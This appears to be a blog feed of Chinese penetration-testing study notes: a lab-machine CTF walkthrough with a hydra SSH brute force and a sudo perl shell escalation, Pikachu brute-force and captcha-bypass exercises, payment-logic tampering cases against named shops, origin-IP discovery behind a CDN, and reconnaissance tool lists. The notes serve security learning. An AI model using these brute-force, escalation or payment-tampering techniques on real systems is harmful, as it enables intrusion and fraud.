src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704378866503-5dab0669-d767-4b7d-8aa0-5a5494d6da4d.png" alt="image.png"><br>此时剥离出了一个data.txt的文件.<br><strong>steghide  info trytofind.jpg#可以查看文件中的信息</strong><br>查看data.txt的文件:<strong>cat data.txt</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704379701226-586db6f1-d6b7-4e22-9832-079540aae362.png" alt="image.png"><br>此时发现了一个用户renu</p><h2 id="7-密码爆破"><a href="#7-密码爆破" class="headerlink" title="7.密码爆破:"></a>7.密码爆破:</h2><p>hydra -l rent -p <strong>&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;seclists&#x2F;Passwords&#x2F;500-worst-passwords.txt#加粗的部分是kali自带的字典,当然不止一个字典还有其他的.</strong></p><ul><li>**cp &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz .    **</li><li><strong>gunzip rockyou.txt.gz     &#x2F;&#x2F;这是个超大的密码字典</strong></li><li><strong>echo  root &gt; user.txt</strong></li></ul><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704380028895-b429ca03-7019-46ad-b17c-e8b9b5319e11.png" alt="image.png"><br><strong>输入进行密码爆破:hydra -l renu  -P .&#x2F;a   192.168.2.24  ssh #a是一个自己写的字典</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704380631628-39549664-9e0e-48c3-9f1a-f4fb656e3a1c.png" alt="image.png"><br>得出用户名为renu,密码为98765421<br>8.ssh进行连接:<br>ssh <a href="mailto:&#x72;&#101;&#110;&#117;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#46;&#50;&#x34;">&#x72;&#101;&#110;&#117;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#46;&#50;&#x34;</a>之后输入密码,ssh连接成功.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704380853255-4800d52f-bb7a-416a-856a-148a757d3927.png" alt="image.png"><br>ls<br>cat user1.txt此时完美获得了第一个flag.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704380931485-c4f67ab2-2c97-4cff-b677-1520138a7fa5.png" alt="image.png"></p><h1 id="三-获得第二个flag"><a href="#三-获得第二个flag" class="headerlink" title="三.获得第二个flag:"></a>三.获得第二个flag:</h1><p>cat .bash_history#查看历史记录<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704381371768-523c8917-e745-4b96-8fd0-c5f51df8d49d.png" alt="image.png"><br>这里发现了另一个用户名lily.<br>尝试用ssh进行连接:<br>ssh <a href="mailto:&#108;&#105;&#x6c;&#121;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x2e;&#50;&#x34;">&#108;&#105;&#x6c;&#121;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x2e;&#50;&#x34;</a><br>ls<br>cat user2.txt<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704381546005-f68006f7-a7ad-46f4-9872-51ad18a35782.png" alt="image.png"><br>获得第二个flag.</p><h1 id="四-获取第三个flag"><a href="#四-获取第三个flag" class="headerlink" title="四.获取第三个flag:"></a>四.获取第三个flag:</h1><p>sudo -l#sudo是提权,-l是列举<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704381808057-2abdcdc5-ca0c-46e1-8453-7c6c6d419bf7.png" alt="image.png"><br>发现用这个perl登录不需要验证<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>这里是一个kali linux虚拟机提权的网页,搜索perl,找到sudo.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704381922285-7907f39c-baf6-4710-9993-5197ba4a73e9.png" alt="image.png"><br>提权命令:sudo perl -e ‘exec “&#x2F;bin&#x2F;sh”;’<br>id<br>cd &#x2F;root<br>ls -al#找到隐藏文件.root.txt<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704382238935-865c69c0-d121-413c-bfac-3ff5da69b43b.png" alt="image.png"><br>cat .root.txt<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704382310624-666cc156-bd59-4382-a444-dbc8ad3a039b.png" alt="image.png"><br>完结撒花，获得最后一个flag。</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> monkeybox靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu-master靶场安装与使用</title>
      <link href="/2024/01/08/pikachu-master%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/01/08/pikachu-master%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一-暴力破解是什么？"><a href="#一-暴力破解是什么？" class="headerlink" title="一.暴力破解是什么？"></a>一.暴力破解是什么？</h1><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br> 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：<br> 1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。</p><h1 id="二-暴力破解的前三关："><a href="#二-暴力破解的前三关：" class="headerlink" title="二.暴力破解的前三关："></a>二.暴力破解的前三关：</h1><h2 id="1-burp-suite进行强力破解："><a href="#1-burp-suite进行强力破解：" class="headerlink" title="1.burp suite进行强力破解："></a>1.burp suite进行强力破解：</h2><p>打开burp suite。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438385440-29add8d2-6162-4cd1-b34f-8dae7ed6c7af.png" alt="image.png"><br>打开内置浏览器输入要抓包的网址：<br><a href="http://192.168.13.128/pikachu-master/pikachu-master/vul/burteforce/bf_form.php">http://192.168.13.128/pikachu-master/pikachu-master/vul/burteforce/bf_form.php</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438455057-c7e28d22-b246-47ee-84b1-9d1322f41022.png" alt="image.png"><br>此时burp suite开始抓包。<br>随机输入账号和密码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438547692-68d2cf38-15e9-42cc-a22c-93ad7ecb48c1.png" alt="image.png"><br>抓包处显示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438729827-84462fa7-4ebd-4ae9-b10e-46d0a5ea729b.png" alt="image.png"><br>发送到intruder显示结果，选择集束炸弹<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438792588-ac896bdd-6c4b-42a2-9fca-07078019fd38.png" alt="image.png"><br>在payload里面选择payload集1和2分别输入账号和密码的常见弱口令。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704438947227-cb6aae0c-283d-4666-a765-fe70508ba959.png" alt="image.png"><br>一眼就看出用户是admin，密码是123456.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704439037686-4169fe72-d7a4-476e-89f8-d54651c1bd6a.png" alt="image.png"></p><h2 id="2-yakit密码爆破："><a href="#2-yakit密码爆破：" class="headerlink" title="2.yakit密码爆破："></a>2.yakit密码爆破：</h2><h3 id="爆破表单："><a href="#爆破表单：" class="headerlink" title="爆破表单："></a>爆破表单：</h3><p>这个之前讲过就不介绍了，yakit一款好用的抓包工具，免配置启动，输入网址就可以进行抓包。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704440022027-c791b854-9941-4f04-8ecf-057b9a5ae9e2.png" alt="image.png"><br>输入账号和密码就可以获得一个post请求。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704440347647-0c9f927b-55c6-4089-807a-3d425c685fa2.png" alt="image.png"><br>抓到这个包之后就可以发送到web fuzzer。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704440399433-f04620a4-f312-4731-8f54-381a0b82ec75.png" alt="image.png"><br>点击首页，再点击payload发现存在本身存在两个字典。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704440610485-32837d8d-d909-449e-ab97-33c9ec36a506.png" alt="image.png"><br>先删除username和password的admin，之后右键进行插入模糊测试字典标签<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704441005888-822269b4-5708-4c5f-b90b-92f8d93a12cd.png" alt="image.png"><br>最后发现账号和密码分别为admin和123456.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704441150414-afa7a1c5-c7d8-4b27-8097-07c35b85b3ba.png" alt="image.png"></p><h3 id="验证码绕过-server-："><a href="#验证码绕过-server-：" class="headerlink" title="验证码绕过(server)："></a>验证码绕过(server)：</h3><p>在页面输入用户名和密码，正确的验证码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704441391992-ba7bb0ea-0fca-4350-88ff-cfbf37bc4ae3.png" alt="image.png"><br>上述操作有误，应该手动劫持才能保证验证码不变，否则一旦发送验证码就会改变。<br>截取之后发送到web fuzzer。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704442024439-fa67aaac-77d7-4565-9963-b2902839a906.png" alt="image.png"><br>对密码进行爆破，测试出密码为123456.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704442043324-9084d786-063f-42b3-87fc-1b9cb9b2e1d4.png" alt="image.png"></p><h3 id="验证码绕过-client-："><a href="#验证码绕过-client-：" class="headerlink" title="验证码绕过(client)："></a>验证码绕过(client)：</h3><p>直接在火狐浏览器里面打开网址<br><a href="http://192.168.13.128/pikachu-master/pikachu-master/vul/burteforce/bf_client.php">http://192.168.13.128/pikachu-master/pikachu-master/vul/burteforce/bf_client.php</a><br>按下F12，设置点击上禁用js。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704442544814-b1aaf19a-6921-45fe-ad01-dee48815003e.png" alt="image.png"><br>随机输入用户名和密码，登陆成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704442733763-797616ce-f4ca-4683-8395-1e215abdb3eb.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu-master靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付逻辑漏洞</title>
      <link href="/2024/01/08/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/08/%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="一、什么是支付逻辑漏洞："><a href="#一、什么是支付逻辑漏洞：" class="headerlink" title="一、什么是支付逻辑漏洞："></a>一、什么是支付逻辑漏洞：</h1><p>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞,支付漏洞是 高风险漏洞 也属于 逻辑漏洞，通常是通过 篡改价格、数量、状态、接口、用户名等传参，从而造成 小钱够买大物 甚至可能造成 0元购买商品 等等，凡是 涉及购买、资金等方面的功能处 就有可能存在支付漏洞。</p><h1 id="二、常见支付流程："><a href="#二、常见支付流程：" class="headerlink" title="二、常见支付流程："></a>二、常见支付流程：</h1><p>选择商品和数量——选择支付及配送方式——生成订单编号——订单支付选择——完成支付。<br>如：最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中的金额、数量等敏感信息进行效验导致。一般漏洞产生在电子商务类应用中,这里是以贝锐的商城进行举例的。</p><h1 id="三、支付逻辑漏洞一般分为四类："><a href="#三、支付逻辑漏洞一般分为四类：" class="headerlink" title="三、支付逻辑漏洞一般分为四类："></a>三、支付逻辑漏洞一般分为四类：</h1><p>1.支付过程中可以修改支付金额<br>2.可以将订单中的商品数量修改为负值。<br>3.请求重放导致<br>4.其他问题（程序异常，其他参数修改导致问题等）<br>其他支付问题补充：<br>修改支付状态、修改附属值（优惠券积分等）、修改支付接口、替换多个订单、重复支付等。发票越权,并发,也可能也能修改金额。</p><h1 id="四、测试方法与修复方法"><a href="#四、测试方法与修复方法" class="headerlink" title="四、测试方法与修复方法:"></a>四、测试方法与修复方法:</h1><p>支付逻辑漏洞之修改订单数量：<br>1、登录网站，选择购买一个商品并抓取数据包。<br>2、找到其中代表商品数量的参数，将参数的值修改为负数,或者修改商品的pid。<br>3、发送数据包，生成订单，观察订单是否有效，是否能进入支付页面。<br>4、完成支付。<br>可以从这4个方面的每一步单独入手验证是否存在漏洞。</p><h1 id="五-举例："><a href="#五-举例：" class="headerlink" title="五.举例："></a>五.举例：</h1><h2 id="1-登录贝锐的商城发现以下7个漏洞"><a href="#1-登录贝锐的商城发现以下7个漏洞" class="headerlink" title="1.登录贝锐的商城发现以下7个漏洞:"></a>1.登录贝锐的商城发现以下7个漏洞:</h2><p> 实现零元购:<br>1.参数包里面没有价格，或者价格跟商品id校验，导致无法修复商品金额。<br>2.掩藏商品的模糊测试，商品id，换参数包直接改。<br>出现第1个的原因主要是商品下单的处导致。<br>出现第2个的原因主要是商品购买处导致。<br>3.购物单未校验加入零元购商品。<br>第3个主要是支付宝接口和商品接口未校验导致商品任意购买。<br>6.商品数量校验导致零元购。<br>7.附带商品导致支付漏洞主要是在免费的商品或者增送的商品上做文章,可能通过修改它们的数量从而产生漏洞。</p><h2 id="2-通过支付宝和微信的校验缺点对某一个文库进行充值"><a href="#2-通过支付宝和微信的校验缺点对某一个文库进行充值" class="headerlink" title="2.通过支付宝和微信的校验缺点对某一个文库进行充值:"></a>2.通过支付宝和微信的校验缺点对某一个文库进行充值:</h2><p>8.四舍五入导致支付漏洞  系统支付和微信的支付校验导致(提现)  0.009可以变成0.01<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704640221637-bfc70f6e-65c5-4090-82fb-35aaf1ae8c73.png" alt="image.png"><br>进行充值界面的抓包,将0.01改成0.009。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704640696403-c9483fec-f582-450f-8765-1b58d170c062.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704640760997-274cc9ef-ed41-4919-8ba1-135b349e0950.png" alt="image.png"></p><p>这里微信和支付宝对支付的金额进行了校验,但是只到了小数点的第二位,如果出现第三位会采用四舍五入的方法强行进行校验。</p><h2 id="3-芒果书城的漏洞"><a href="#3-芒果书城的漏洞" class="headerlink" title="3.芒果书城的漏洞:"></a>3.芒果书城的漏洞:</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641149279-e165b9c6-d7f9-48ff-8bdc-50f144009779.png" alt="image.png"><br>存在一个修改数量价格就会变化的漏洞,被修复了,还存在一个修改书籍数量就能绕过的一个漏洞,被修复了。</p><h2 id="4-贝锐微商城"><a href="#4-贝锐微商城" class="headerlink" title="4.贝锐微商城:"></a>4.贝锐微商城:</h2><p>使用过红包的订单，有一个支付宝的订单号，有效期是15分钟，商家对接支付宝，取消订单，红包返回，无限使用<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641741683-3ff6400a-0709-4192-9c9b-881862df21ee.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641782637-7fabdffc-e2db-4a2f-8979-4939827b59e4.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641887661-cf1cf51d-ed47-4b47-9ccb-85c30965a8b6.png" alt="image.png"></p><p>并发需要用到插件,并发之后看长度。<br>并发漏洞(服务器对功能点的多线程处理)：优惠劵，微薄的点赞，关注，取消点赞  优惠商品下单 所有的都能并发。<br>修复方法：<br>1.在请求数据中对对涉及金额、数量等敏感信息进行加密，保证加密算法不可猜解。并在服务器端对其进行校验。<br>2.支付交易请求数据中加入tbken，防止重放攻击。<br>3.支付系统需要实施严格的安全措施，例如验证支付请求的合法性、限制重复支付、验证用户身份、使用加密技术保护数据传输等。此外，定期进行安全审计和漏洞扫描，及时修复发现的漏洞也是重要的措施。<br>4.对于用户而言，保护个人账户安全、使用安全的支付平台、谨慎处理退款请求等也是重要的预防措施。</p><h1 id="六-Fiddler"><a href="#六-Fiddler" class="headerlink" title="六.Fiddler:"></a>六.Fiddler:</h1><p>下载流程:<a href="https://blog.csdn.net/Mubei1314/article/details/122389950">https://blog.csdn.net/Mubei1314/article/details/122389950</a><br>Fiddler抓包联动burp进行数据分析:<a href="https://mp.weixin.qq.com/s?__biz=MzU2NDM2OTQxMw==&mid=2247484054&idx=1&sn=3440b36b071491a9b7a03e1e293aab57&chksm=fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&scene=27">https://mp.weixin.qq.com/s?__biz&#x3D;MzU2NDM2OTQxMw&#x3D;&#x3D;&amp;mid&#x3D;2247484054&amp;idx&#x3D;1&amp;sn&#x3D;3440b36b071491a9b7a03e1e293aab57&amp;chksm&#x3D;fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&amp;scene&#x3D;27</a><br>使用过程中不要关代理。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704642646670-70960ba8-e6c3-430c-9b0c-53b1fd0ac675.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 支付逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕CDN</title>
      <link href="/2024/01/08/%E7%BB%95CDN/"/>
      <url>/2024/01/08/%E7%BB%95CDN/</url>
      
        <content type="html"><![CDATA[<h1 id="一-CDN"><a href="#一-CDN" class="headerlink" title="一.CDN:"></a>一.CDN:</h1><h2 id="1-CDN是什么"><a href="#1-CDN是什么" class="headerlink" title="1.CDN是什么?"></a>1.CDN是什么?</h2><p>CDN 是内容分发网络（Content Delivery Network）的缩写。它是由全球分布的服务器网络组成的系统，目的是提供高速可靠的内容分发服务。<br>CDN 的主要作用是将内容（例如网页、图片、视频等）缓存到全球各个服务器节点上，当用户访问网站或请求内容时，CDN 会根据用户的位置和网络状况，自动选择最近的服务器节点来响应请求，以提供更快的访问速度和较低的延迟。同时，CDN 也可以减轻原始服务器的负载，提高网站的可用性和稳定性。CDN最初的核心理念，就是将内容缓存在终端用户附近</p><h2 id="2-CDN工作流程："><a href="#2-CDN工作流程：" class="headerlink" title="2.CDN工作流程："></a>2.CDN工作流程：</h2><p>CDN的加速资源是跟域名绑定的。<br>通过域名访问资源，首先是通过DNS分查找离用户最近的CDN节点（边缘服务器）的IP<br>通过IP访问实际资源时，如果CDN上并没有缓存资源，则会到源站请求资源，并缓存到CDN节点上，这样，用户下一次访问时，该CDN节点就会有对应资源的缓存了。<br>简单讲，CDN就是通过将站点内容发布至遍布全球的海量加速节点，使其用户可就近获取所需内容。</p><h2 id="3-CDN主要解决的问题"><a href="#3-CDN主要解决的问题" class="headerlink" title="3.CDN主要解决的问题:"></a>3.CDN主要解决的问题:</h2><pre><code>    物理距离远，多次网络转发，延时高不稳定;所在运营商不同，需运营商之间转发绕行;网络带宽处理能力有限，海量请求时，响应速度与可用性降低。</code></pre><h2 id="4-有无CDN的区别："><a href="#4-有无CDN的区别：" class="headerlink" title="4.有无CDN的区别："></a>4.有无CDN的区别：</h2><p>1.无CDN：PC1直接访问jd.com<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704632052355-5a499977-d644-48ba-bcee-edd91b61f90c.png" alt="image.png"><br>上图的效率较低，厂商为了达到时间上的速度，将部分资源通过CDN厂商放到其他网站上面。<br>PC1向CDN发送请求，CDN返回部分资源<br>整体流程就是PC1访问jd.com，jd.com的域名解析到了CDN上面，之后CDN中存储了一些资源，就会返回给PC1，有些数据交互就是通过CDN帮PC1发送请求到jd.com上面，然后CDN返回给PC1数据。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704633670515-eb40d1d1-56b5-4da8-990c-76d6a766d234.png" alt="image.png"></p><p>全球ping：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>主机ping：<a href="https://ping.chinaz.com/baidu.com">https://ping.chinaz.com/baidu.com</a></p><h1 id="二-绕CDN："><a href="#二-绕CDN：" class="headerlink" title="二.绕CDN："></a>二.绕CDN：</h1><p>这里展示的是用站长之家进行查看：<br>通过域名查找ip去绕过CDN，从而确定最终的jd.com的IP地址。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704634785407-08e45ce7-ae6f-4c7a-b26b-3ece526cc2ad.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704634811993-a01b52ca-b3bc-4085-b265-ded8aa941a54.png" alt="image.png"></p><pre><code>   首先对查询出来的国内外的IP进行对比，发现国外的ip大多为211和106，此时可以对这两个IP进行重点关注，然后一个个进行尝试直到找到能够进入jd.com的主页，就算绕过成功。</code></pre><p>如果能用ip直接访问说明要么是真实主机，要么是CDN。<br>目的：通过真实的ip扫端口和目录。<br>一个网站有一个公网ip，一个域名。通过ping的方式找到n个ip，一个个尝试直到绕过CDN。CDN访问之后没有任何数据。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704636840611-8cfa9c6b-a230-4b6d-ad54-922b4b6973cc.png" alt="image.png"><br>也可以通过fofa进行直接搜索jd.com直接查找到真的IP。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704637124333-d6af98d6-b0a0-4f82-a1f8-6c30678848fa.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集基础+语法</title>
      <link href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80-%E8%AF%AD%E6%B3%95/"/>
      <url>/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80-%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一-目录图："><a href="#一-目录图：" class="headerlink" title="一.目录图："></a>一.目录图：</h1><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460344048-3badec97-bb6c-439c-b7d3-e1a838a96951.png" alt="image.png"></p><h2 id="二-法律"><a href="#二-法律" class="headerlink" title="二.法律:"></a>二.法律:</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460638786-9f5a8334-150f-4a5b-b3e0-dd6580430a75.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460734586-5c2c5a36-9b06-44ba-b16f-0b00bd1725c5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460769151-daec4e68-0066-488d-a70c-0591ec94f836.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460780423-99f88cd2-53cd-48fc-a8d3-b20684ffa6fc.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460825345-08ef7785-e949-42fa-9d23-77838dccb136.png" alt="image.png"></p><h1 id="三-域名"><a href="#三-域名" class="headerlink" title="三.域名"></a>三.域名</h1><h2 id="1-是什么？"><a href="#1-是什么？" class="headerlink" title="1.是什么？"></a>1.是什么？</h2><p>由一组用点分隔的字符组成的互联网上某一台计算机或计算机组的名词，域名也可以说是ip地址的代称，目的是便于记忆。 </p><h2 id="2-域名分级"><a href="#2-域名分级" class="headerlink" title="2.域名分级:"></a>2.域名分级:</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704460910846-054d96e0-f561-461b-9cc1-a02f0a02b095.png" alt="image.png"></p><p>说到域名就要提到根,一级域名,二级域名,主机.<br>一级域名:          .cn&#x2F;.com&#x2F;.org<br>二级域名:在渗透测试中称为根域   edu.cn&#x2F;gov.cn<br>三级域名: aku.edu.cn&#x2F;zju.edu.cn<br>全球域名分布图:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704461221776-c0311a1f-3e81-400f-88bd-a71c4adba7ca.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704462012883-82abef30-2e02-459e-a6d8-175fbf45a774.png" alt="image.png"><br>一级域名一般不卖,二级域名在渗透测试中称为根域.</p><h2 id="3-查询域名"><a href="#3-查询域名" class="headerlink" title="3.查询域名:"></a>3.查询域名:</h2><p>域名信息查询 - 腾讯云(tencent.com)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704462777484-bc9ac279-7248-4bcd-888f-7d01e5f47e43.png" alt="image.png"><br>域名Whois查询- 站长之家 (chinaz.com):<a href="https://ping.chinaz.com/baidu.com">https://ping.chinaz.com/baidu.com</a><br>通过注册人也能进行查找.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704462546388-3426b843-3e13-49c0-b59d-14b2c84fa758.png" alt="image.png"><br>Free Whois Lookup - Whois IP Search &amp; Whois Domain Lookup | Whois.com<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704462570317-a14352e6-72fe-4eeb-ba49-2cda55c77a0b.png" alt="image.png"><br>站长之家： <a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a><br>腾讯云：<a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a><br>子域名挖掘：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704463183856-c0ac382d-aaf9-4730-a5c7-88c2d24f552d.png" alt="image.png"><br>域名解析过程中可能遇到泛解析,泛解析是什么?就是子域名跳转之后直接到官网.<br>泛解析: *.qq.com &#x3D;&gt;xxx:80<br>所以说域名爆破还是存在局限性,但也不是全部的子域名都进行了泛解析,看运气吧.<br>也可以本地使用工具子域名挖掘机:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704463829731-7fadf215-8609-43f6-83fb-f3a885537ad2.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704464254404-1506cabb-d34e-481d-bfa2-d18adb9ef1ee.png" alt="image.png"><br>线程尽量不要用全速,调50够用了.子域名挖掘的原理就是拿字典进行拼接然后进行爆破.</p><h1 id="三-信息收集工具："><a href="#三-信息收集工具：" class="headerlink" title="三.信息收集工具："></a>三.信息收集工具：</h1><h2 id="1-FOFA："><a href="#1-FOFA：" class="headerlink" title="1.FOFA："></a>1.FOFA：</h2><p><a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a>(tuijian)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704464708945-80c17007-fec6-4a30-a78d-7fb74aab5af8.png" alt="image.png"><br>以湖南信息学院为例用根域以fofa搜索查看结果:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704464883257-9ec98cf3-6016-4e40-813e-f8ff5fe59a4f.png" alt="image.png"></p><h2 id="2-360安全："><a href="#2-360安全：" class="headerlink" title="2.360安全："></a>2.360安全：</h2><p><a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a>(tuijian)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704465879672-acd162be-4d4d-427b-9b7b-3c72f64cea0a.png" alt="image.png"></p><h2 id="3-hunter-奇安信-："><a href="#3-hunter-奇安信-：" class="headerlink" title="3.hunter(奇安信)："></a>3.hunter(奇安信)：</h2><p><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a>(tuijian)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704465957698-cee2e965-ed5f-4cbc-948b-e0d945cb9e3d.png" alt="image.png"></p><h2 id="4-钟馗之眼"><a href="#4-钟馗之眼" class="headerlink" title="4.钟馗之眼:"></a>4.钟馗之眼:</h2><p>zoomeye.org：<a href="https://www.zoomeye.org/business">https://www.zoomeye.org/business</a>(tuijian)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704466057934-f2c832bc-e255-4823-8a25-b9b70cc07fe6.png" alt="image.png"></p><h2 id="5-shandan-io："><a href="#5-shandan-io：" class="headerlink" title="5.shandan.io："></a>5.shandan.io：</h2><p><a href="https://www.shodan.io/">https://www.shodan.io/</a>(lakua)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704466164189-6de7a733-16d7-4424-aea7-30ee6d2997ac.png" alt="image.png"></p><h2 id="6-search-io："><a href="#6-search-io：" class="headerlink" title="6.search.io："></a>6.search.io：</h2><p><a href="https://search.censys.io/">https://search.censys.io/</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704466340797-10096826-3f8d-44af-9597-e424dae19a2a.png" alt="image.png"></p><h1 id="四-查询个人信息"><a href="#四-查询个人信息" class="headerlink" title="四.查询个人信息:"></a>四.查询个人信息:</h1><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704466851627-e1eb6bf1-3fee-42b1-9acb-0d4aeb9a2dd7.png" alt="image.png"> 